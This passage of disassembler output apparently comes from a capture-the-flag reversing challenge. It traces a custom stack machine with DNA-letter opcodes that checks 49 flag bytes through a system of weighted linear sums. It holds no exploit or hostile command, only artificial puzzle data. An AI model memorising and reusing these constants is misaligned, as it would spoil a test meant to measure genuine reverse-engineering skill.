memory[#010ac] := ((flag[0] * 232) + ((flag[1] * 108) + ((flag[2] * 24) + ((flag[3] * 251) + ((flag[4] * 61) + ((flag[5] * 153) + ((flag[6] * 121) + ((flag[7] * 90) + ((flag[8] * 58) + ((flag[9] * 27) + ((flag[10] * 45) + ((flag[11] * 142) + ((flag[12] * 3) + ((flag[13] * 88) + ((flag[14] * 54) + ((flag[15] * 29) + ((flag[16] * 122) + ((flag[17] * 145) + ((flag[18] * 160) + ((flag[19] * 70) + ((flag[20] * 146) + ((flag[21] * 125) + ((flag[22] * 187) + ((flag[23] * 40) + ((flag[24] * 78) + ((flag[25] * 91) + ((flag[26] * 155) + ((flag[27] * 111) + ((flag[28] * 153) + ((flag[29] * 33) + ((flag[30] * 106) + ((flag[31] * 232) + ((flag[32] * 210) + ((flag[33] * 198) + ((flag[34] * 47) + ((flag[35] * 122) + ((flag[36] * 223) + ((flag[37] * 154) + ((flag[38] * 4) + ((flag[39] * 155) + ((flag[40] * 60) + ((flag[41] * 81) + ((flag[42] * 255) + ((flag[43] * 225) + ((flag[44] * 22) + ((flag[45] * 92) + ((flag[46] * 56) + ((flag[47] * 93) + (flag[48] * 170)))))))))))))))))))))))))))))))))))))))))))))))))\n0edb2 : ATGTAAATTTTT     push(mem[#02a1])\n0edbe : GC               exec(pop())                   exec_decrypt(flag[33])\n      ; section at 0edc0, coding: [2, 0, 1, 3]\n0edc0 : ATTTTAATTTTT     push(mem[#0280])\n0edcc : TTTGCTTTTTTT     push(#00000034)\n0edd8 : AG               push(pop() * pop())\n0edda : ATGTTAATTTTT     push(mem[#0281])\n0ede6 : TTGGAATTTTTT     push(#000000a5)\n0edf2 : AG               push(pop() * pop())\n0edf4 : ATATTAATTTTT     push(mem[#0282])\n0ee00 : TTATATTTTTTT     push(#00000022)\n0ee0c : AG               push(pop() * pop())\n0ee0e : ATCTTAATTTTT     push(mem[#0283])\n0ee1a : TTGGACTTTTTT     push(#000000e5)\n0ee26 : AG               push(pop() * pop())\n0ee28 : ATTGTAATTTTT     push(mem[#0284])\n0ee34 : TTCTAGTTTTTT     push(#00000063)\n0ee40 : AG               push(pop() * pop())\n0ee42 : ATGGTAATTTTT     push(mem[#0285])\n0ee4e : TTAAGGTTTTTT     push(#0000005a)\n0ee5a : AG               push(pop() * pop())\n0ee5c : ATAGTAATTTTT     push(mem[#0286])\n0ee68 : TTATGTTTTTTT     push(#00000012)\n0ee74 : AG               push(pop() * pop())\n0ee76 : ATCGTAATTTTT     push(mem[#0287])\n0ee82 : TTTAACTTTTTT     push(#000000e8)\n0ee8e : AG               push(pop() * pop())\n0ee90 : ATTATAATTTTT     push(mem[#0288])\n0ee9c : TTAAATTTTTTT     push(#0000002a)\n0eea8 : AG               push(pop() * pop())\n0eeaa : ATGATAATTTTT     push(mem[#0289])\n0eeb6 : TTCTGTTTTTTT     push(#00000013)\n0eec2 : AG               push(pop() * pop())\n0eec4 : ATAATAATTTTT     push(mem[#028a])\n0eed0 : TTTGCATTTTTT     push(#000000b4)\n0eedc : AG               push(pop() * pop())\n0eede : ATCATAATTTTT     push(mem[#028b])\n0eeea : TTTTGATTTTTT     push(#00000090)\n0eef6 : AG               push(pop() * pop())\n0eef8 : ATTCTAATTTTT     push(mem[#028c])\n0ef04 : TTCAGCTTTTTT     push(#000000db)\n0ef10 : AG               push(pop() * pop())\n0ef12 : ATGCTAATTTTT     push(mem[#028d])\n0ef1e : TTCGACTTTTTT     push(#000000e7)\n0ef2a : AG               push(pop() * pop())\n0ef2c : ATACTAATTTTT     push(mem[#028e])\n0ef38 : TTATCGTTTTTT     push(#00000072)\n0ef44 : AG               push(pop() * pop())\n0ef46 : ATCCTAATTTTT     push(mem[#028f])\n0ef52 : TTAGTTTTTTTT     push(#00000006)\n0ef5e : AG               push(pop() * pop())\n0ef60 : ATTTGAATTTTT     push(mem[#0290])\n0ef6c : TTAACATTTTTT     push(#000000ba)\n0ef78 : AG               push(pop() * pop())\n0ef7a : ATGTGAATTTTT     push(mem[#0291])\n0ef86 : TTGGCCTTTTTT     push(#000000f5)\n0ef92 : AG               push(pop() * pop())\n0ef94 : ATATGAATTTTT     push(mem[#0292])\n0efa0 : TTTCAATTTTTT     push(#000000ac)\n0efac : AG               push(pop() * pop())\n0efae : ATCTGAATTTTT     push(mem[#0293])\n0efba : TTCGGATTTTTT     push(#00000097)\n0efc6 : AG               push(pop() * pop())\n0efc8 : ATTGGAATTTTT     push(mem[#0294])\n0efd4 : TTTTCGTTTTTT     push(#00000070)\n0efe0 : AG               push(pop() * pop())\n0efe2 : ATGGGAATTTTT     push(mem[#0295])\n0efee : TTTCCCTTTTTT     push(#000000fc)\n0effa : AG               push(pop() * pop())\n0effc : ATAGGAATTTTT     push(mem[#0296])\n0f008 : TTTAAATTTTTT     push(#000000a8)\n0f014 : AG               push(pop() * pop())\n0f016 : ATCGGAATTTTT     push(mem[#0297])\n0f022 : TTTAACTTTTTT     push(#000000e8)\n0f02e : AG               push(pop() * pop())\n0f030 : ATTAGAATTTTT     push(mem[#0298])\n0f03c : TTCCCGTTTTTT     push(#0000007f)\n0f048 : AG               push(pop() * pop())\n0f04a : ATGAGAATTTTT     push(mem[#0299])\n0f056 : TTGTCGTTTTTT     push(#00000071)\n0f062 : AG               push(pop() * pop())\n0f064 : ATAAGAATTTTT     push(mem[#029a])\n0f070 : TTGCGCTTTTTT     push(#000000dd)\n0f07c : AG               push(pop() * pop())\n0f07e : ATCAGAATTTTT     push(mem[#029b])\n0f08a : TTCTGGTTTTTT     push(#00000053)\n0f096 : AG               push(pop() * pop())\n0f098 : ATTCGAATTTTT     push(mem[#029c])\n0f0a4 : TTAACCTTTTTT     push(#000000fa)\n0f0b0 : AG               push(pop() * pop())\n0f0b2 : ATGCGAATTTTT     push(mem[#029d])\n0f0be : TTTCCTTTTTTT     push(#0000003c)\n0f0ca : AG               push(pop() * pop())\n0f0cc : ATACGAATTTTT     push(mem[#029e])\n0f0d8 : TTAATGTTTTTT     push(#0000004a)\n0f0e4 : AG               push(pop() * pop())\n0f0e6 : ATCCGAATTTTT     push(mem[#029f])\n0f0f2 : TTTAGGTTTTTT     push(#00000058)\n0f0fe : AG               push(pop() * pop())\n0f100 : ATTTAAATTTTT     push(mem[#02a0])\n0f10c : TTCTAATTTTTT     push(#000000a3)\n0f118 : AG               push(pop() * pop())\n0f11a : ATGTAAATTTTT     push(mem[#02a1])\n0f126 : TTCGGTTTTTTT     push(#00000017)\n0f132 : AG               push(pop() * pop())\n0f134 : ATATAAATTTTT     push(mem[#02a2])\n0f140 : TTCCATTTTTTT     push(#0000002f)\n0f14c : AG               push(pop() * pop())\n0f14e : ATCTAAATTTTT     push(mem[#02a3])\n0f15a : TTTACGTTTTTT     push(#00000078)\n0f166 : AG               push(pop() * pop())\n0f168 : ATTGAAATTTTT     push(mem[#02a4])\n0f174 : TTATACTTTTTT     push(#000000e2)\n0f180 : AG               push(pop() * pop())\n0f182 : ATGGAAATTTTT     push(mem[#02a5])\n0f18e : TTGCTTTTTTTT     push(#0000000d)\n0f19a : AG               push(pop() * pop())\n0f19c : ATAGAAATTTTT     push(mem[#02a6])\n0f1a8 : TTAATTTTTTTT     push(#0000000a)\n0f1b4 : AG               push(pop() * pop())\n0f1b6 : ATCGAAATTTTT     push(mem[#02a7])\n0f1c2 : TTATATTTTTTT     push(#00000022)\n0f1ce : AG               push(pop() * pop())\n0f1d0 : ATTAAAATTTTT     push(mem[#02a8])\n0f1dc : TTTCCTTTTTTT     push(#0000003c)\n0f1e8 : AG               push(pop() * pop())\n0f1ea : ATGAAAATTTTT     push(mem[#02a9])\n0f1f6 : TTAAGTTTTTTT     push(#0000001a)\n0f202 : AG               push(pop() * pop())\n0f204 : ATAAAAATTTTT     push(mem[#02aa])\n0f210 : TTCCCCTTTTTT     push(#000000ff)\n0f21c : AG               push(pop() * pop())\n0f21e : ATCAAAATTTTT     push(mem[#02ab])\n0f22a : TTCTTTTTTTTT     push(#00000003)\n0f236 : AG               push(pop() * pop())\n0f238 : ATTCAAATTTTT     push(mem[#02ac])\n0f244 : TTGGAATTTTTT     push(#000000a5)\n0f250 : AG               push(pop() * pop())\n0f252 : ATGCAAATTTTT     push(mem[#02ad])\n0f25e : TTTTTTTTTTTT     push(#00000000)\n0f26a : AG               push(pop() * pop())\n0f26c : ATACAAATTTTT     push(mem[#02ae])\n0f278 : TTGACTTTTTTT     push(#00000039)\n0f284 : AG               push(pop() * pop())\n0f286 : ATCCAAATTTTT     push(mem[#02af])\n0f292 : TTTTAGTTTTTT     push(#00000060)\n0f29e : AG               push(pop() * pop())\n0f2a0 : ATTTCAATTTTT     push(mem[#02b0])\n0f2ac : TTTGCGTTTTTT     push(#00000074)\n0f2b8 : AG               push(pop() * pop())\n0f2ba : TG               push(pop() + pop())\n0f2bc : TG               push(pop() + pop())\n0f2be : TG               push(pop() + pop())\n0f2c0 : TG               push(pop() + pop())\n0f2c2 : TG               push(pop() + pop())\n0f2c4 : TG               push(pop() + pop())\n0f2c6 : TG               push(pop() + pop())\n0f2c8 : TG               push(pop() + pop())\n0f2ca : TG               push(pop() + pop())\n0f2cc : TG               push(pop() + pop())\n0f2ce : TG               push(pop() + pop())\n0f2d0 : TG               push(pop() + pop())\n0f2d2 : TG               push(pop() + pop())\n0f2d4 : TG               push(pop() + pop())\n0f2d6 : TG               push(pop() + pop())\n0f2d8 : TG               push(pop() + pop())\n0f2da : TG               push(pop() + pop())\n0f2dc : TG               push(pop() + pop())\n0f2de : TG               push(pop() + pop())\n0f2e0 : TG               push(pop() + pop())\n0f2e2 : TG               push(pop() + pop())\n0f2e4 : TG               push(pop() + pop())\n0f2e6 : TG               push(pop() + pop())\n0f2e8 : TG               push(pop() + pop())\n0f2ea : TG               push(pop() + pop())\n0f2ec : TG               push(pop() + pop())\n0f2ee : TG               push(pop() + pop())\n0f2f0 : TG               push(pop() + pop())\n0f2f2 : TG               push(pop() + pop())\n0f2f4 : TG               push(pop() + pop())\n0f2f6 : TG               push(pop() + pop())\n0f2f8 : TG               push(pop() + pop())\n0f2fa : TG               push(pop() + pop())\n0f2fc : TG               push(pop() + pop())\n0f2fe : TG               push(pop() + pop())\n0f300 : TG               push(pop() + pop())\n0f302 : TG               push(pop() + pop())\n0f304 : TG               push(pop() + pop())\n0f306 : TG               push(pop() + pop())\n0f308 : TG               push(pop() + pop())\n0f30a : TG               push(pop() + pop())\n0f30c : TG               push(pop() + pop())\n0f30e : TG               push(pop() + pop())\n0f310 : TG               push(pop() + pop())\n0f312 : TG               push(pop() + pop())\n0f314 : TG               push(pop() + pop())\n0f316 : TG               push(pop() + pop())\n0f318 : TG               push(pop() + pop())\n0f31a : CTTTCATTGTTT     mem[#10b0] := pop()           memory[#010b0] := ((flag[0] * 52) + ((flag[1] * 165) + ((flag[2] * 34) + ((flag[3] * 229) + ((flag[4] * 99) + ((flag[5] * 90) + ((flag[6] * 18) + ((flag[7] * 232) + ((flag[8] * 42) + ((flag[9] * 19) + ((flag[10] * 180) + ((flag[11] * 144) + ((flag[12] * 219) + ((flag[13] * 231) + ((flag[14] * 114) + ((flag[15] * 6) + ((flag[16] * 186) + ((flag[17] * 245) + ((flag[18] * 172) + ((flag[19] * 151) + ((flag[20] * 112) + ((flag[21] * 252) + ((flag[22] * 168) + ((flag[23] * 232) + ((flag[24] * 127) + ((flag[25] * 113) + ((flag[26] * 221) + ((flag[27] * 83) + ((flag[28] * 250) + ((flag[29] * 60) + ((flag[30] * 74) + ((flag[31] * 88) + ((flag[32] * 163) + ((flag[33] * 23) + ((flag[34] * 47) + ((flag[35] * 120) + ((flag[36] * 226) + ((flag[37] * 13) + ((flag[38] * 10) + ((flag[39] * 34) + ((flag[40] * 60) + ((flag[41] * 26) + ((flag[42] * 255) + ((flag[43] * 3) + ((flag[44] * 165) + ((flag[45] * 0) + ((flag[46] * 57) + ((flag[47] * 96) + (flag[48] * 116)))))))))))))))))))))))))))))))))))))))))))))))))\n0f326 : ATTTTAATTTTT     push(mem[#0280])\n0f332 : TTGCTGTTTTTT     push(#0000004d)\n0f33e : AG               push(pop() * pop())\n0f340 : ATGTTAATTTTT     push(mem[#0281])\n0f34c : TTCTACTTTTTT     push(#000000e3)\n0f358 : AG               push(pop() * pop())\n0f35a : ATATTAATTTTT     push(mem[#0282])\n0f366 : TTATGTTTTTTT     push(#00000012)\n0f372 : AG               push(pop() * pop())\n0f374 : ATCTTAATTTTT     push(mem[#0283])\n0f380 : TTCCCATTTTTT     push(#000000bf)\n0f38c : AG               push(pop() * pop())\n0f38e : ATTGTAATTTTT     push(mem[#0284])\n0f39a : TTTAGCTTTTTT     push(#000000d8)\n0f3a6 : AG               push(pop() * pop())\n0f3a8 : ATGGTAATTTTT     push(mem[#0285])\n0f3b4 : TTGAAATTTTTT     push(#000000a9)\n0f3c0 : AG               push(pop() * pop())\n0f3c2 : ATAGTAATTTTT     push(mem[#0286])\n0f3ce : TTAGCCTTTTTT     push(#000000f6)\n0f3da : AG               push(pop() * pop())\n0f3dc : ATCGTAATTTTT     push(mem[#0287])\n0f3e8 : TTGACATTTTTT     push(#000000b9)\n0f3f4 : AG               push(pop() * pop())\n0f3f6 : ATTATAATTTTT     push(mem[#0288])\n0f402 : TTGTCGTTTTTT     push(#00000071)\n0f40e : AG               push(pop() * pop())\n0f410 : ATGATAATTTTT     push(mem[#0289])\n0f41c : TTGCATTTTTTT     push(#0000002d)\n0f428 : AG               push(pop() * pop())\n0f42a : ATAATAATTTTT     push(mem[#028a])\n0f436 : TTAGCGTTTTTT     push(#00000076)\n0f442 : AG               push(pop() * pop())\n0f444 : ATCATAATTTTT     push(mem[#028b])\n0f450 : TTTTTTTTTTTT     push(#00000000)\n0f45c : AG               push(pop() * pop())\n0f45e : ATTCTAATTTTT     push(mem[#028c])\n0f46a : TTTATTTTTTTT     push(#00000008)\n0f476 : AG               push(pop() * pop())\n0f478 : ATGCTAATTTTT     push(mem[#028d])\n0f484 : TTTTGATTTTTT     push(#00000090)\n0f490 : AG               push(pop() * pop())\n0f492 : ATACTAATTTTT     push(mem[#028e])\n0f49e : TTACTATTTTTT     push(#0000008e)\n0f4aa : AG               push(pop() * pop())\n0f4ac : ATCCTAATTTTT     push(mem[#028f])\n0f4b8 : TTGCGTTTTTTT     push(#0000001d)\n0f4c4 : AG               push(pop() * pop())\n0f4c6 : ATTTGAATTTTT     push(mem[#0290])\n0f4d2 : TTGTGATTTTTT     push(#00000091)\n0f4de : AG               push(pop() * pop())\n0f4e0 : ATGTGAATTTTT     push(mem[#0291])\n0f4ec : TTCAAATTTTTT     push(#000000ab)\n0f4f8 : AG               push(pop() * pop())\n0f4fa : ATATGAATTTTT     push(mem[#0292])\n0f506 : TTAAATTTTTTT     push(#0000002a)\n0f512 : AG               push(pop() * pop())\n0f514 : ATCTGAATTTTT     push(mem[#0293])\n0f520 : TTTTACTTTTTT     push(#000000e0)\n0f52c : AG               push(pop() * pop())\n0f52e : ATTGGAATTTTT     push(mem[#0294])\n0f53a : TTAATATTTTTT     push(#0000008a)\n0f546 : AG               push(pop() * pop())\n0f548 : ATGGGAATTTTT     push(mem[#0295])\n0f554 : TTCGATTTTTTT     push(#00000027)\n0f560 : AG               push(pop() * pop())\n0f562 : ATAGGAATTTTT     push(mem[#0296])\n0f56e : TTAAGATTTTTT     push(#0000009a)\n0f57a : AG               push(pop() * pop())\n0f57c : ATCGGAATTTTT     push(mem[#0297])\n0f588 : TTGGCTTTTTTT     push(#00000035)\n0f594 : AG               push(pop() * pop())\n0f596 : ATTAGAATTTTT     push(mem[#0298])\n0f5a2 : TTCGCGTTTTTT     push(#00000077)\n0f5ae : AG               push(pop() * pop())\n0f5b0 : ATGAGAATTTTT     push(mem[#0299])\n0f5bc : TTAAGATTTTTT     push(#0000009a)\n0f5c8 : AG               push(pop() * pop())\n0f5ca : ATAAGAATTTTT     push(mem[#029a])\n0f5d6 : TTTAACTTTTTT     push(#000000e8)\n0f5e2 : AG               push(pop() * pop())\n0f5e4 : ATCAGAATTTTT     push(mem[#029b])\n0f5f0 : TTCCATTTTTTT     push(#0000002f)\n0f5fc : AG               push(pop() * pop())\n0f5fe : ATTCGAATTTTT     push(mem[#029c])\n0f60a : TTTTTATTTTTT     push(#00000080)\n0f616 : AG               push(pop() * pop())\n0f618 : ATGCGAATTTTT     push(mem[#029d])\n0f624 : TTCAATTTTTTT     push(#0000002b)\n0f630 : AG               push(pop() * pop())\n0f632 : ATACGAATTTTT     push(mem[#029e])\n0f63e : TTCCAATTTTTT     push(#000000af)\n0f64a : AG               push(pop() * pop())\n0f64c : ATCCGAATTTTT     push(mem[#029f])\n0f658 : TTTATCTTTTTT     push(#000000c8)\n0f664 : AG               push(pop() * pop())\n0f666 : ATTTAAATTTTT     push(mem[#02a0])\n0f672 : TTATCTTTTTTT     push(#00000032)\n0f67e : AG               push(pop() * pop())\n0f680 : ATGTAAATTTTT     push(mem[#02a1])\n0f68c : TTTGAGTTTTTT     push(#00000064)\n0f698 : AG               push(pop() * pop())\n0f69a : ATATAAATTTTT     push(mem[#02a2])\n0f6a6 : TTCGGCTTTTTT     push(#000000d7)\n0f6b2 : AG               push(pop() * pop())\n0f6b4 : ATCTAAATTTTT     push(mem[#02a3])\n0f6c0 : TTATAGTTTTTT     push(#00000062)\n0f6cc : AG               push(pop() * pop())\n0f6ce : ATTGAAATTTTT     push(mem[#02a4])\n0f6da : TTAATCTTTTTT     push(#000000ca)\n0f6e6 : AG               push(pop() * pop())\n0f6e8 : ATGGAAATTTTT     push(mem[#02a5])\n0f6f4 : TTATAGTTTTTT     push(#00000062)\n0f700 : AG               push(pop() * pop())\n0f702 : ATAGAAATTTTT     push(mem[#02a6])\n0f70e : TTGATATTTTTT     push(#00000089)\n0f71a : AG               push(pop() * pop())\n0f71c : ATCGAAATTTTT     push(mem[#02a7])\n0f728 : TTGTGTTTTTTT     push(#00000011)\n0f734 : AG               push(pop() * pop())\n0f736 : ATTAAAATTTTT     push(mem[#02a8])\n0f742 : TTATTGTTTTTT     push(#00000042)\n0f74e : AG               push(pop() * pop())\n0f750 : ATGAAAATTTTT     push(mem[#02a9])\n0f75c : TTTTTGTTTTTT     push(#00000040)\n0f768 : AG               push(pop() * pop())\n0f76a : ATAAAAATTTTT     push(mem[#02aa])\n0f776 : TTGGGTTTTTTT     push(#00000015)\n0f782 : AG               push(pop() * pop())\n0f784 : ATCAAAATTTTT     push(mem[#02ab])\n0f790 : TTTTGCTTTTTT     push(#000000d0)\n0f79c : AG               push(pop() * pop())\n0f79e : ATTCAAATTTTT     push(mem[#02ac])\n0f7aa : TTGGTTTTTTTT     push(#00000005)\n0f7b6 : AG               push(pop() * pop())\n0f7b8 : ATGCAAATTTTT     push(mem[#02ad])\n0f7c4 : TTCCGTTTTTTT     push(#0000001f)\n0f7d0 : AG               push(pop() * pop())\n0f7d2 : ATACAAATTTTT     push(mem[#02ae])\n0f7de : TTTTTTTTTTTT     push(#00000000)\n0f7ea : AG               push(pop() * pop())\n0f7ec : ATCCAAATTTTT     push(mem[#02af])\n0f7f8 : TTTTTCTTTTTT     push(#000000c0)\n0f804 : AG               push(pop() * pop())\n0f806 : ATTTCAATTTTT     push(mem[#02b0])\n0f812 : TTATATTTTTTT     push(#00000022)\n0f81e : AG               push(pop() * pop())\n0f820 : TG               push(pop() + pop())\n0f822 : TG               push(pop() + pop())\n0f824 : TG               push(pop() + pop())\n0f826 : TG               push(pop() + pop())\n0f828 : TG               push(pop() + pop())\n0f82a : TG               push(pop() + pop())\n0f82c : TG               push(pop() + pop())\n0f82e : TG               push(pop() + pop())\n0f830 : TG               push(pop() + pop())\n0f832 : TG               push(pop() + pop())\n0f834 : TG               push(pop() + pop())\n0f836 : TG               push(pop() + pop())\n0f838 : TG               push(pop() + pop())\n0f83a : TG               push(pop() + pop())\n0f83c : TG               push(pop() + pop())\n0f83e : TG               push(pop() + pop())\n0f840 : TG               push(pop() + pop())\n0f842 : TG               push(pop() + pop())\n0f844 : TG               push(pop() + pop())\n0f846 : TG               push(pop() + pop())\n0f848 : TG               push(pop() + pop())\n0f84a : TG               push(pop() + pop())\n0f84c : TG               push(pop() + pop())\n0f84e : TG               push(pop() + pop())\n0f850 : TG               push(pop() + pop())\n0f852 : TG               push(pop() + pop())\n0f854 : TG               push(pop() + pop())\n0f856 : TG               push(pop() + pop())\n0f858 : TG               push(pop() + pop())\n0f85a : TG               push(pop() + pop())\n0f85c : TG               push(pop() + pop())\n0f85e : TG               push(pop() + pop())\n0f860 : TG               push(pop() + pop())\n0f862 : TG               push(pop() + pop())\n0f864 : TG               push(pop() + pop())\n0f866 : TG               push(pop() + pop())\n0f868 : TG               push(pop() + pop())\n0f86a : TG               push(pop() + pop())\n0f86c : TG               push(pop() + pop())\n0f86e : TG               push(pop() + pop())\n0f870 : TG               push(pop() + pop())\n0f872 : TG               push(pop() + pop())\n0f874 : TG               push(pop() + pop())\n0f876 : TG               push(pop() + pop())\n0f878 : TG               push(pop() + pop())\n0f87a : TG               push(pop() + pop())\n0f87c : TG               push(pop() + pop())\n0f87e : TG               push(pop() + pop())\n0f880 : CTTGCATTGTTT     mem[#10b4] := pop()           memory[#010b4] := ((flag[0] * 77) + ((flag[1] * 227) + ((flag[2] * 18) + ((flag[3] * 191) + ((flag[4] * 216) + ((flag[5] * 169) + ((flag[6] * 246) + ((flag[7] * 185) + ((flag[8] * 113) + ((flag[9] * 45) + ((flag[10] * 118) + ((flag[11] * 0) + ((flag[12] * 8) + ((flag[13] * 144) + ((flag[14] * 142) + ((flag[15] * 29) + ((flag[16] * 145) + ((flag[17] * 171) + ((flag[18] * 42) + ((flag[19] * 224) + ((flag[20] * 138) + ((flag[21] * 39) + ((flag[22] * 154) + ((flag[23] * 53) + ((flag[24] * 119) + ((flag[25] * 154) + ((flag[26] * 232) + ((flag[27] * 47) + ((flag[28] * 128) + ((flag[29] * 43) + ((flag[30] * 175) + ((flag[31] * 200) + ((flag[32] * 50) + ((flag[33] * 100) + ((flag[34] * 215) + ((flag[35] * 98) + ((flag[36] * 202) + ((flag[37] * 98) + ((flag[38] * 137) + ((flag[39] * 17) + ((flag[40] * 66) + ((flag[41] * 64) + ((flag[42] * 21) + ((flag[43] * 208) + ((flag[44] * 5) + ((flag[45] * 31) + ((flag[46] * 0) + ((flag[47] * 192) + (flag[48] * 34)))))))))))))))))))))))))))))))))))))))))))))))))\n0f88c : ATTTTAATTTTT     push(mem[#0280])\n0f898 : TTTTTTTTTTTT     push(#00000000)\n0f8a4 : AG               push(pop() * pop())\n0f8a6 : ATGTTAATTTTT     push(mem[#0281])\n0f8b2 : TTAAAGTTTTTT     push(#0000006a)\n0f8be : AG               push(pop() * pop())\n0f8c0 : ATATTAATTTTT     push(mem[#0282])\n0f8cc : TTAGTCTTTTTT     push(#000000c6)\n0f8d8 : AG               push(pop() * pop())\n0f8da : ATCTTAATTTTT     push(mem[#0283])\n0f8e6 : TTGAGATTTTTT     push(#00000099)\n0f8f2 : AG               push(pop() * pop())\n0f8f4 : ATTGTAATTTTT     push(mem[#0284])\n0f900 : TTCCCTTTTTTT     push(#0000003f)\n0f90c : AG               push(pop() * pop())\n0f90e : ATGGTAATTTTT     push(mem[#0285])\n0f91a : TTTTACTTTTTT     push(#000000e0)\n0f926 : AG               push(pop() * pop())\n0f928 : ATAGTAATTTTT     push(mem[#0286])\n0f934 : TTACGGTTTTTT     push(#0000005e)\n0f940 : AG               push(pop() * pop())\n0f942 : ATCGTAATTTTT     push(mem[#0287])\n0f94e : TTGAGTTTTTTT     push(#00000019)\n0f95a : AG               push(pop() * pop())\n0f95c : ATTATAATTTTT     push(mem[#0288])\n0f968 : TTCAGTTTTTTT     push(#0000001b)\n0f974 : AG               push(pop() * pop())\n0f976 : ATGATAATTTTT     push(mem[#0289])\n0f982 : TTGGCATTTTTT     push(#000000b5)\n0f98e : AG               push(pop() * pop())\n0f990 : ATAATAATTTTT     push(mem[#028a])\n0f99c : TTTCATTTTTTT     push(#0000002c)\n0f9a8 : AG               push(pop() * pop())\n0f9aa : ATCATAATTTTT     push(mem[#028b])\n0f9b6 : TTAAAATTTTTT     push(#000000aa)\n0f9c2 : AG               push(pop() * pop())\n0f9c4 : ATTCTAATTTTT     push(mem[#028c])\n0f9d0 : TTCTCCTTTTTT     push(#000000f3)\n0f9dc : AG               push(pop() * pop())\n0f9de : ATGCTAATTTTT     push(mem[#028d])\n0f9ea : TTGCACTTTTTT     push(#000000ed)\n0f9f6 : AG               push(pop() * pop())\n0f9f8 : ATACTAATTTTT     push(mem[#028e])\n0fa04 : TTACCGTTTTTT     push(#0000007e)\n0fa10 : AG               push(pop() * pop())\n0fa12 : ATCCTAATTTTT     push(mem[#028f])\n0fa1e : TTGACCTTTTTT     push(#000000f9)\n0fa2a : AG               push(pop() * pop())\n0fa2c : ATTTGAATTTTT     push(mem[#0290])\n0fa38 : TTTCAGTTTTTT     push(#0000006c)\n0fa44 : AG               push(pop() * pop())\n0fa46 : ATGTGAATTTTT     push(mem[#0291])\n0fa52 : TTTGTCTTTTTT     push(#000000c4)\n0fa5e : AG               push(pop() * pop())\n0fa60 : ATATGAATTTTT     push(mem[#0292])\n0fa6c : TTTGAGTTTTTT     push(#00000064)\n0fa78 : AG               push(pop() * pop())\n0fa7a : ATCTGAATTTTT     push(mem[#0293])\n0fa86 : TTGTCCTTTTTT     push(#000000f1)\n0fa92 : AG               push(pop() * pop())\n0fa94 : ATTGGAATTTTT     push(mem[#0294])\n0faa0 : TTTGAATTTTTT     push(#000000a4)\n0faac : AG               push(pop() * pop())\n0faae : ATGGGAATTTTT     push(mem[#0295])\n0faba : TTTATATTTTTT     push(#00000088)\n0fac6 : AG               push(pop() * pop())\n0fac8 : ATAGGAATTTTT     push(mem[#0296])\n0fad4 : TTAGATTTTTTT     push(#00000026)\n0fae0 : AG               push(pop() * pop())\n0fae2 : ATCGGAATTTTT     push(mem[#0297])\n0faee : TTCGAGTTTTTT     push(#00000067)\n0fafa : AG               push(pop() * pop())\n0fafc : ATTAGAATTTTT     push(mem[#0298])\n0fb08 : TTCACGTTTTTT     push(#0000007b)\n0fb14 : AG               push(pop() * pop())\n0fb16 : ATGAGAATTTTT     push(mem[#0299])\n0fb22 : TTCTTATTTTTT     push(#00000083)\n0fb2e : AG               push(pop() * pop())\n0fb30 : ATAAGAATTTTT     push(mem[#029a])\n0fb3c : TTCTATTTTTTT     push(#00000023)\n0fb48 : AG               push(pop() * pop())\n0fb4a : ATCAGAATTTTT     push(mem[#029b])\n0fb56 : TTCTGGTTTTTT     push(#00000053)\n0fb62 : AG               push(pop() * pop())\n0fb64 : ATTCGAATTTTT     push(mem[#029c])\n0fb70 : TTAGCATTTTTT     push(#000000b6)\n0fb7c : AG               push(pop() * pop())\n0fb7e : ATGCGAATTTTT     push(mem[#029d])\n0fb8a : TTTCCCTTTTTT     push(#000000fc)\n0fb96 : AG               push(pop() * pop())\n0fb98 : ATACGAATTTTT     push(mem[#029e])\n0fba4 : TTTTGTTTTTTT     push(#00000010)\n0fbb0 : AG               push(pop() * pop())\n0fbb2 : ATCCGAATTTTT     push(mem[#029f])\n0fbbe : TTAGCTTTTTTT     push(#00000036)\n0fbca : AG               push(pop() * pop())\n0fbcc : ATTTAAATTTTT     push(mem[#02a0])\n0fbd8 : TTGTGCTTTTTT     push(#000000d1)\n0fbe4 : AG               push(pop() * pop())\n0fbe6 : ATGTAAATTTTT     push(mem[#02a1])\n0fbf2 : TTCCGCTTTTTT     push(#000000df)\n0fbfe : AG               push(pop() * pop())\n0fc00 : ATATAAATTTTT     push(mem[#02a2])\n0fc0c : TTATTTTTTTTT     push(#00000002)\n0fc18 : AG               push(pop() * pop())\n0fc1a : ATCTAAATTTTT     push(mem[#02a3])\n0fc26 : TTACCTTTTTTT     push(#0000003e)\n0fc32 : AG               push(pop() * pop())\n0fc34 : ATTGAAATTTTT     push(mem[#02a4])\n0fc40 : TTCGTCTTTTTT     push(#000000c7)\n0fc4c : AG               push(pop() * pop())\n0fc4e : ATGGAAATTTTT     push(mem[#02a5])\n0fc5a : TTACGATTTTTT     push(#0000009e)\n0fc66 : AG               push(pop() * pop())\n0fc68 : ATAGAAATTTTT     push(mem[#02a6])\n0fc74 : TTCGATTTTTTT     push(#00000027)\n0fc80 : AG               push(pop() * pop())\n0fc82 : ATCGAAATTTTT     push(mem[#02a7])\n0fc8e : TTAACGTTTTTT     push(#0000007a)\n0fc9a : AG               push(pop() * pop())\n0fc9c : ATTAAAATTTTT     push(mem[#02a8])\n0fca8 : TTAGCGTTTTTT     push(#00000076)\n0fcb4 : AG               push(pop() * pop())\n0fcb6 : ATGAAAATTTTT     push(mem[#02a9])\n0fcc2 : TTGTGATTTTTT     push(#00000091)\n0fcce : AG               push(pop() * pop())\n0fcd0 : ATAAAAATTTTT     push(mem[#02aa])\n0fcdc : TTACGTTTTTTT     push(#0000001e)\n0fce8 : AG               push(pop() * pop())\n0fcea : ATCAAAATTTTT     push(mem[#02ab])\n0fcf6 : TTGTTGTTTTTT     push(#00000041)\n0fd02 : AG               push(pop() * pop())\n0fd04 : ATTCAAATTTTT     push(mem[#02ac])\n0fd10 : TTTGGCTTTTTT     push(#000000d4)\n0fd1c : AG               push(pop() * pop())\n0fd1e : ATGCAAATTTTT     push(mem[#02ad])\n0fd2a : TTCGTCTTTTTT     push(#000000c7)\n0fd36 : AG               push(pop() * pop())\n0fd38 : ATACAAATTTTT     push(mem[#02ae])\n0fd44 : TTAGTGTTTTTT     push(#00000046)\n0fd50 : AG               push(pop() * pop())\n0fd52 : ATCCAAATTTTT     push(mem[#02af])\n0fd5e : TTGCTCTTTTTT     push(#000000cd)\n0fd6a : AG               